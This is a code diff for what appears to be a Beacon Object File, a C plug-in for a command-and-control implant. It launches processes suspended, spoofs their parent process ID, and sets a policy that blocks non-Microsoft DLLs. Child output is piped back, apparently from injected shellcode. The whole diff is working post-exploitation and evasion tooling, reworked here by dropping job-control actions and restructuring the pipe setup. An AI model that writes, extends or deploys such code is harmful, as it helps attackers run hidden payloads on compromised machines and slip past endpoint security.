@@ -1,8 +1,8 @@
 #include <windows.h>
-#include <stdio.h> // snprintf
+#include <stdio.h>
 #include "beacon.h"
 
-// --- Manual Definitions for Attributes ---
+// --- Definitions ---
 #ifndef PROC_THREAD_ATTRIBUTE_PARENT_PROCESS
 #define PROC_THREAD_ATTRIBUTE_PARENT_PROCESS 0x00020000
 #endif
@@ -15,21 +15,16 @@
 #ifndef PROCESS_CREATION_MITIGATION_POLICY_BLOCK_NON_MICROSOFT_BINARIES_ALWAYS_ON
 #define PROCESS_CREATION_MITIGATION_POLICY_BLOCK_NON_MICROSOFT_BINARIES_ALWAYS_ON 0x100000000000
 #endif
+#ifndef PROC_THREAD_ATTRIBUTE_HANDLE_LIST
+#define PROC_THREAD_ATTRIBUTE_HANDLE_LIST 0x00020002
+#endif
 
-// --- Structs ---
 typedef struct _MY_STARTUPINFOEXA {
     STARTUPINFOA StartupInfo;
     LPPROC_THREAD_ATTRIBUTE_LIST lpAttributeList;
 } MY_STARTUPINFOEXA, *PMY_STARTUPINFOEXA;
 
-typedef struct _JOB_CONTEXT {
-    HANDLE hReadPipe;
-    HANDLE hProcess;
-    DWORD pid;
-    int id;
-} JOB_CONTEXT, *PJOB_CONTEXT;
-
-// --- Function Pointers ---
+// --- API Typedefs ---
 typedef BOOL (WINAPI *EXP_InitializeProcThreadAttributeList)(LPPROC_THREAD_ATTRIBUTE_LIST, DWORD, DWORD, PSIZE_T);
 typedef BOOL (WINAPI *EXP_UpdateProcThreadAttribute)(LPPROC_THREAD_ATTRIBUTE_LIST, DWORD, DWORD_PTR, PVOID, SIZE_T, PVOID, PSIZE_T);
 typedef void (WINAPI *EXP_DeleteProcThreadAttributeList)(LPPROC_THREAD_ATTRIBUTE_LIST);
@@ -38,19 +33,9 @@ typedef HLOCAL (WINAPI *EXP_LocalFree)(HLOCAL);
 typedef BOOL (WINAPI *EXP_CreatePipe)(PHANDLE, PHANDLE, LPSECURITY_ATTRIBUTES, DWORD);
 typedef BOOL (WINAPI *EXP_SetHandleInformation)(HANDLE, DWORD, DWORD);
 typedef BOOL (WINAPI *EXP_ReadFile)(HANDLE, LPVOID, DWORD, LPDWORD, LPOVERLAPPED);
-typedef BOOL (WINAPI *EXP_PeekNamedPipe)(HANDLE, LPVOID, DWORD, LPDWORD, LPDWORD, LPDWORD);
-typedef BOOL (WINAPI *EXP_GetExitCodeProcess)(HANDLE, LPDWORD);
 typedef void (WINAPI *EXP_Sleep)(DWORD);
-typedef DWORD (WINAPI *EXP_GetTempPathA)(DWORD, LPSTR);
-typedef UINT (WINAPI *EXP_GetTempFileNameA)(LPCSTR, LPCSTR, UINT, LPSTR);
-typedef BOOL (WINAPI *EXP_DeleteFileA)(LPCSTR);
-typedef DWORD (WINAPI *EXP_SetFilePointer)(HANDLE, LONG, PLONG, DWORD);
 
-typedef LPVOID (WINAPI *EXP_HeapAlloc)(HANDLE, DWORD, SIZE_T);
-typedef BOOL (WINAPI *EXP_HeapFree)(HANDLE, DWORD, LPVOID);
-typedef HANDLE (WINAPI *EXP_GetProcessHeap)(VOID);
-
-// --- Custom Memset/Helpers ---
+// --- Helpers ---
 #pragma optimize("", off) 
 void * _memset(void *dest, int c, size_t count) {
     char *bytes = (char *)dest;
@@ -84,19 +69,6 @@ WINBASEAPI HANDLE WINAPI KERNEL32$CreateNamedPipeA(LPCSTR, DWORD, DWORD, DWORD, 
 WINBASEAPI HANDLE WINAPI KERNEL32$CreateFileA(LPCSTR, DWORD, DWORD, LPSECURITY_ATTRIBUTES, DWORD, DWORD, HANDLE);
 WINBASEAPI DWORD WINAPI KERNEL32$GetTickCount(VOID);
 
-void simple_job_key(char* buf, int id) {
-    char* p = buf;
-    char* prefix = "donut_job_";
-    while (*prefix) *p++ = *prefix++;
-    if (id >= 10) {
-        *p++ = '0' + (id / 10);
-        *p++ = '0' + (id % 10);
-    } else {
-        *p++ = '0' + id;
-    }
-    *p = 0;
-}
-
 void simple_hex(char* buf, unsigned int val) {
     char* map = "0123456789ABCDEF";
     buf[0] = '\\'; buf[1] = '\\'; buf[2] = '.'; buf[3] = '\\';
@@ -109,21 +81,11 @@ void simple_hex(char* buf, unsigned int val) {
     buf[idx] = 0;
 }
 
-// --- Actions ---
-#define ACTION_RUN_BLOCKING 0
-#define ACTION_RUN_ASYNC 1
-
-#include <stdarg.h>
-
-#define ACTION_READ         2
-#define ACTION_KILL         3
-#define ACTION_LIST         4
-
 void go(char* args, int len) {
     datap parser;
     BeaconDataParse(&parser, args, len);
     
-    int action = BeaconDataInt(&parser);
+    // int action = BeaconDataInt(&parser); // Removed
     int jobId = BeaconDataInt(&parser);
     int ppid = BeaconDataInt(&parser);
     char* program = BeaconDataExtract(&parser, NULL);
@@ -143,103 +105,11 @@ void go(char* args, int len) {
     EXP_CreatePipe pCreatePipe = (EXP_CreatePipe)KERNEL32$GetProcAddress(hKernel32, "CreatePipe");
     EXP_SetHandleInformation pSetHandleInformation = (EXP_SetHandleInformation)KERNEL32$GetProcAddress(hKernel32, "SetHandleInformation");
     EXP_ReadFile pReadFile = (EXP_ReadFile)KERNEL32$GetProcAddress(hKernel32, "ReadFile");
-    EXP_PeekNamedPipe pPeekNamedPipe = (EXP_PeekNamedPipe)KERNEL32$GetProcAddress(hKernel32, "PeekNamedPipe");
-    EXP_GetExitCodeProcess pGetExitCodeProcess = (EXP_GetExitCodeProcess)KERNEL32$GetProcAddress(hKernel32, "GetExitCodeProcess");
+
     EXP_Sleep pSleep = (EXP_Sleep)KERNEL32$GetProcAddress(hKernel32, "Sleep");
-    EXP_HeapAlloc pHeapAlloc = (EXP_HeapAlloc)KERNEL32$GetProcAddress(hKernel32, "HeapAlloc");
-    EXP_HeapFree pHeapFree = (EXP_HeapFree)KERNEL32$GetProcAddress(hKernel32, "HeapFree");
-    EXP_GetProcessHeap pGetProcessHeap = (EXP_GetProcessHeap)KERNEL32$GetProcAddress(hKernel32, "GetProcessHeap");
-    EXP_GetTempPathA pGetTempPathA = (EXP_GetTempPathA)KERNEL32$GetProcAddress(hKernel32, "GetTempPathA");
-    EXP_GetTempFileNameA pGetTempFileNameA = (EXP_GetTempFileNameA)KERNEL32$GetProcAddress(hKernel32, "GetTempFileNameA");
-    EXP_DeleteFileA pDeleteFileA = (EXP_DeleteFileA)KERNEL32$GetProcAddress(hKernel32, "DeleteFileA");
-    EXP_SetFilePointer pSetFilePointer = (EXP_SetFilePointer)KERNEL32$GetProcAddress(hKernel32, "SetFilePointer");
 
     if(!pInitializeProcThreadAttributeList || !pUpdateProcThreadAttribute) {
         BeaconPrintf(CALLBACK_ERROR, "Failed to resolve API symbols.");
-        return;
-    }
-
-    // --- Dispatch Action ---
-    if (action == ACTION_LIST) {
-        BeaconPrintf(CALLBACK_OUTPUT, "=== Active Jobs ===");
-        char key[64];
-        BOOL found = FALSE;
-        for(int i=1; i<=20; i++) {
-            simple_job_key(key, i);
-            PJOB_CONTEXT ctx = (PJOB_CONTEXT)BeaconGetValue(key);
-            if(ctx) {
-                found = TRUE;
-                DWORD ec = 0;
-                pGetExitCodeProcess(ctx->hProcess, &ec);
-                const char* status = (ec == STILL_ACTIVE) ? "Running" : "Exited";
-                BeaconPrintf(CALLBACK_OUTPUT, "Job %d: PID %d [%s]", i, ctx->pid, status);
-            }
-        }
-        if(!found) BeaconPrintf(CALLBACK_OUTPUT, "No active jobs found.");
-        return;
-    }
-
-    if (action == ACTION_READ || action == ACTION_KILL) {
-        char key[64];
-        simple_job_key(key, jobId);
-        PJOB_CONTEXT ctx = (PJOB_CONTEXT)BeaconGetValue(key);
-        
-        if (!ctx) {
-            BeaconPrintf(CALLBACK_ERROR, "Job %d not found.", jobId);
-            return;
-        }
-
-        if (action == ACTION_READ) {
-            char buffer[1024];
-            DWORD bytesRead = 0;
-            DWORD bytesAvail = 0;
-            DWORD ec = 0;
-            BOOL hasOutput = FALSE;
-            
-            // Read output from PIPE (Non-Blocking Check)
-            while(TRUE) {
-                if(pPeekNamedPipe(ctx->hReadPipe, NULL, 0, NULL, &bytesAvail, NULL) && bytesAvail > 0) {
-                    if(pReadFile(ctx->hReadPipe, buffer, sizeof(buffer)-1, &bytesRead, NULL) && bytesRead > 0) {
-                        buffer[bytesRead] = 0;
-                        hasOutput = TRUE;
-                        // Emit for server storage
-                        BeaconPrintf(CALLBACK_OUTPUT, "EXEC_TASK|output|%d|0||running|0|%s", jobId, buffer);
-                        // Also show to user
-                        BeaconPrintf(CALLBACK_OUTPUT, "%s", buffer);
-                    } else break;
-                } else break; 
-            }
-            
-            pGetExitCodeProcess(ctx->hProcess, &ec);
-            if(ec != STILL_ACTIVE) {
-               // Emit exit status for server
-               BeaconPrintf(CALLBACK_OUTPUT, "EXEC_TASK|exited|%d|%d||exited|%d|", jobId, ctx->pid, ec);
-               BeaconPrintf(CALLBACK_OUTPUT, "[*] Job %d has finished (Code: %d).", jobId, ec);
-               
-               // Cleanup
-               KERNEL32$CloseHandle(ctx->hProcess);
-               KERNEL32$CloseHandle(ctx->hReadPipe);
-               HANDLE hHeap = pGetProcessHeap();
-               pHeapFree(hHeap, 0, ctx);
-               BeaconRemoveValue(key);
-            } else if (!hasOutput) {
-               BeaconPrintf(CALLBACK_OUTPUT, "[*] Job %d still running, no new output.", jobId);
-            }
-        } 
-        else if (action == ACTION_KILL) {
-             KERNEL32$TerminateProcess(ctx->hProcess, 0);
-             
-             // Emit crashed status for server
-             BeaconPrintf(CALLBACK_OUTPUT, "EXEC_TASK|crashed|%d|%d||crashed|1|", jobId, ctx->pid);
-             
-             KERNEL32$CloseHandle(ctx->hProcess);
-             KERNEL32$CloseHandle(ctx->hReadPipe); 
-             
-             HANDLE hHeap = pGetProcessHeap();
-             pHeapFree(hHeap, 0, ctx);
-             BeaconRemoveValue(key);
-             BeaconPrintf(CALLBACK_OUTPUT, "Job %d killed/removed.", jobId);
-        }
         return;
     }
 
@@ -250,95 +120,23 @@ void go(char* args, int len) {
     }
 
     // --- Pipes ---
-    // 1. Output Pipe (Named Pipe for Asynchronous/Overlapped compat if needed, simplifies ID)
-    char localPipeName[64];
-    char* effectivePipeName = pipeName;  // Use JS-provided name if available
-    
-    if (!pipeName || pipeName[0] == '\0') {
-        // Generate local pipe name if not provided
-        unsigned int tick = KERNEL32$GetTickCount();
-        simple_hex(localPipeName, tick); 
-        effectivePipeName = localPipeName;
-    }
-
-    HANDLE hReadPipe = KERNEL32$CreateNamedPipeA(
-        effectivePipeName,
-        PIPE_ACCESS_INBOUND,
-        PIPE_TYPE_BYTE | PIPE_READMODE_BYTE | PIPE_WAIT,
-        1,
-        4096,
-        4096,
-        0,
-        NULL
-    );
-
-    if (hReadPipe == INVALID_HANDLE_VALUE) {
-        BeaconPrintf(CALLBACK_ERROR, "CreateNamedPipe failed: %d", KERNEL32$GetLastError());
-        return;
-    }
-    
-    SECURITY_ATTRIBUTES sa;
-    sa.nLength = sizeof(SECURITY_ATTRIBUTES);
-    sa.bInheritHandle = TRUE;
-    sa.lpSecurityDescriptor = NULL;
-
-    HANDLE hWritePipe = KERNEL32$CreateFileA(
-        effectivePipeName,
-        GENERIC_WRITE,
-        0,
-        &sa,
-        OPEN_EXISTING,
-        FILE_ATTRIBUTE_NORMAL,
-        NULL
-    );
-
-    if (hWritePipe == INVALID_HANDLE_VALUE) {
-        BeaconPrintf(CALLBACK_ERROR, "CreateFile(Pipe) failed: %d", KERNEL32$GetLastError());
-        KERNEL32$CloseHandle(hReadPipe);
-        return;
-    }
-
-    // 2. Input Pipe (Anonymous)
-    // We give the Read end to the Child. We keep the Write end (closed or kept).
+    HANDLE hReadPipe = NULL;
+    HANDLE hWritePipe = NULL;
     HANDLE hStdInRead = NULL;
     HANDLE hStdInWrite = NULL;
-    if (!pCreatePipe(&hStdInRead, &hStdInWrite, &sa, 0)) {
-         BeaconPrintf(CALLBACK_ERROR, "CreatePipe(In) failed: %d", KERNEL32$GetLastError());
-         KERNEL32$CloseHandle(hReadPipe);
-         KERNEL32$CloseHandle(hWritePipe);
-         return;
-    }
-    // Ensure Write end is NOT inherited?
-    pSetHandleInformation(hStdInWrite, HANDLE_FLAG_INHERIT, 0);
-
-    PROCESS_INFORMATION pi;
-    MY_STARTUPINFOEXA si_ex;
-    STARTUPINFOA si_plain;
-    LPSTARTUPINFOA si_ptr = NULL;
-    DWORD creationFlags = CREATE_SUSPENDED;
     
-    _memset(&pi, 0, sizeof(PROCESS_INFORMATION));
-    _memset(&si_ex, 0, sizeof(MY_STARTUPINFOEXA));
-    _memset(&si_plain, 0, sizeof(STARTUPINFOA));
-
-    HANDLE hParent = NULL;
+    // Determine mode
     BOOL useParent = (ppid > 0);
-    DWORD attributeCount = 0;
-    BOOL useBlockDLLs = 1; 
-    BOOL usePipeClient = FALSE;  // Whether shellcode will connect to pipe as client
+    BOOL usePipeClient = FALSE;
 
-    // If PPID is specified and we have a pipe name, use the client approach
-    if(useParent && pipeName && pipeName[0] != '\0') {
+    if (useParent && pipeName && pipeName[0] != '\0') {
         usePipeClient = TRUE;
-        useBlockDLLs = 0;  // Disable BlockDLLs when PPID spoofing
+    }
+
+    if (usePipeClient) {
+        // --- PPID / Pipe Client Mode ---
+        // We only create the Server end. The Child (stub) will connect as Client.
         
-        // Close the old pipes - we'll create a new one with the provided name
-        KERNEL32$CloseHandle(hReadPipe);
-        KERNEL32$CloseHandle(hWritePipe);
-        KERNEL32$CloseHandle(hStdInRead);
-        KERNEL32$CloseHandle(hStdInWrite);
-        
-        // Create named pipe server with the provided name
         hReadPipe = KERNEL32$CreateNamedPipeA(
             pipeName,
             PIPE_ACCESS_INBOUND,
@@ -354,10 +152,84 @@ void go(char* args, int len) {
             BeaconPrintf(CALLBACK_ERROR, "CreateNamedPipe(%s) failed: %d", pipeName, KERNEL32$GetLastError());
             return;
         }
+
+    } else {
+        // --- Standard Mode ---
+        // We create Server + Client handles for inheritance.
         
-        BeaconPrintf(CALLBACK_OUTPUT, "DEBUG: Created pipe server: %s", pipeName);
+        char localPipeName[64];
+        char* effectivePipeName = pipeName;
         
-        // Open parent process
+        if (!pipeName || pipeName[0] == '\0') {
+            unsigned int tick = KERNEL32$GetTickCount();
+            simple_hex(localPipeName, tick); 
+            effectivePipeName = localPipeName;
+        }
+
+        hReadPipe = KERNEL32$CreateNamedPipeA(
+            effectivePipeName,
+            PIPE_ACCESS_INBOUND,
+            PIPE_TYPE_BYTE | PIPE_READMODE_BYTE | PIPE_WAIT,
+            1,
+            4096,
+            4096,
+            0,
+            NULL
+        );
+
+        if (hReadPipe == INVALID_HANDLE_VALUE) {
+            BeaconPrintf(CALLBACK_ERROR, "CreateNamedPipe failed: %d", KERNEL32$GetLastError());
+            return;
+        }
+        
+        SECURITY_ATTRIBUTES sa;
+        sa.nLength = sizeof(SECURITY_ATTRIBUTES);
+        sa.bInheritHandle = TRUE;
+        sa.lpSecurityDescriptor = NULL;
+
+        hWritePipe = KERNEL32$CreateFileA(
+            effectivePipeName,
+            GENERIC_WRITE,
+            0,
+            &sa,
+            OPEN_EXISTING,
+            FILE_ATTRIBUTE_NORMAL,
+            NULL
+        );
+
+        if (hWritePipe == INVALID_HANDLE_VALUE) {
+            BeaconPrintf(CALLBACK_ERROR, "CreateFile(Pipe) failed: %d", KERNEL32$GetLastError());
+            KERNEL32$CloseHandle(hReadPipe);
+            return;
+        }
+
+        // Input Pipe (Anonymous)
+        if (!pCreatePipe(&hStdInRead, &hStdInWrite, &sa, 0)) {
+             BeaconPrintf(CALLBACK_ERROR, "CreatePipe(In) failed: %d", KERNEL32$GetLastError());
+             KERNEL32$CloseHandle(hReadPipe);
+             KERNEL32$CloseHandle(hWritePipe);
+             return;
+        }
+        pSetHandleInformation(hStdInWrite, HANDLE_FLAG_INHERIT, 0);
+    }
+
+    PROCESS_INFORMATION pi;
+    MY_STARTUPINFOEXA si_ex;
+    STARTUPINFOA si_plain;
+    LPSTARTUPINFOA si_ptr = NULL;
+    DWORD creationFlags = CREATE_SUSPENDED;
+    
+    _memset(&pi, 0, sizeof(PROCESS_INFORMATION));
+    _memset(&si_ex, 0, sizeof(MY_STARTUPINFOEXA));
+    _memset(&si_plain, 0, sizeof(STARTUPINFOA));
+
+    HANDLE hParent = NULL;
+    DWORD attributeCount = 0;
+    BOOL useBlockDLLs = 1; 
+
+    // Handle Attributes for PPID or Normal Mode
+    if(usePipeClient) {
+         // Open parent process
         hParent = KERNEL32$OpenProcess(PROCESS_CREATE_PROCESS, FALSE, ppid);
         if(!hParent) {
             BeaconPrintf(CALLBACK_ERROR, "OpenProcess(PPID %d) failed: %d", ppid, KERNEL32$GetLastError());
@@ -365,8 +237,9 @@ void go(char* args, int len) {
             return;
         }
         
-        attributeCount = 1;  // Only PARENT_PROCESS, no HANDLE_LIST needed
-    } else if(!useParent) {
+        attributeCount = 1;  // PARENT_PROCESS
+        if(useBlockDLLs) attributeCount++; 
+    } else if(!usePipeClient) { // Changed from !useParent to !usePipeClient
         // Normal mode - use BlockDLLs
         if(useBlockDLLs) attributeCount++;
     }
@@ -393,9 +266,17 @@ void go(char* args, int len) {
             return;
         }
         
-        // Only set PARENT_PROCESS - no HANDLE_LIST needed (stub connects to pipe)
+        // Set PARENT_PROCESS
         if(!pUpdateProcThreadAttribute(si_ex.lpAttributeList, 0, PROC_THREAD_ATTRIBUTE_PARENT_PROCESS, &hParent, sizeof(HANDLE), NULL, NULL)) {
             BeaconPrintf(CALLBACK_ERROR, "UpdateAttrib(Parent) failed: %d", KERNEL32$GetLastError());
+        }
+
+        // Set BlockDLLs if enabled
+        if(useBlockDLLs) {
+            DWORD64 policy = PROCESS_CREATION_MITIGATION_POLICY_BLOCK_NON_MICROSOFT_BINARIES_ALWAYS_ON;
+            if(!pUpdateProcThreadAttribute(si_ex.lpAttributeList, 0, PROC_THREAD_ATTRIBUTE_MITIGATION_POLICY, &policy, sizeof(DWORD64), NULL, NULL)) {
+                 BeaconPrintf(CALLBACK_ERROR, "UpdateAttrib(BlockDLLs) failed: %d", KERNEL32$GetLastError());
+            }
         }
     } else if(attributeCount > 0) {
         // Normal mode with BlockDLLs
@@ -442,10 +323,7 @@ void go(char* args, int len) {
     
     // Cleanup handles we don't need after CreateProcess
     if(!usePipeClient) {
-        // Keep hWritePipe open for Async jobs so JobsController has a valid handle
-        if (action != ACTION_RUN_ASYNC) {
-            KERNEL32$CloseHandle(hWritePipe);
-        }
+        // Keep hWritePipe open (Always Async)
         KERNEL32$CloseHandle(hStdInRead);
         KERNEL32$CloseHandle(hStdInWrite);
     }
@@ -491,7 +369,7 @@ void go(char* args, int len) {
     // --- Async Execution (Default) ---
     // Register the job with the native JobsController
     if (BeaconJobRegister(jobId, pi.hProcess, (WORD)pi.dwProcessId, hReadPipe, hWritePipe)) {
-        BeaconPrintf(CALLBACK_OUTPUT, "[+] Job %d started (PID: %d). Pipe Read Handle: %p. Output will stream automatically.", jobId, pi.dwProcessId, hReadPipe);
+        BeaconPrintf(CALLBACK_OUTPUT, "[+] Process started (PID: %d). Output will stream automatically.", pi.dwProcessId);
     } else {
             BeaconPrintf(CALLBACK_ERROR, "Failed to register job. Closing process.");
             KERNEL32$TerminateProcess(pi.hProcess, 0);
